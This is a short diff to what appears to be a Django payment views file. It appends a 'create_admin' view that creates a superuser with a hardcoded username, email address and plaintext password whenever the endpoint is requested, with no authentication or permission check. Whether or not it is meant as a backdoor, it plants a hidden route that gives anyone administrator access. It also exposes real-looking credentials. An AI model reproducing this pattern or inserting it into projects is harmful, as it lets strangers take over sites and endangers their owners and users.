@@ -62,3 +62,14 @@ def paymentComplete(request):
 
 def paymentSuccess(request):
     return render(request, 'payment_success.html')  # Renders the success page
+
+
+
+from django.contrib.auth.models import User
+from django.http import JsonResponse
+
+def create_admin(request):
+    if not User.objects.filter(username="Jushduhh").exists():
+        User.objects.create_superuser("Jushduhh", "deepraazbiswas@gmail.com", "Baseplate321")
+        return JsonResponse({"status": "Superuser created"})
+    return JsonResponse({"status": "Superuser already exists"})
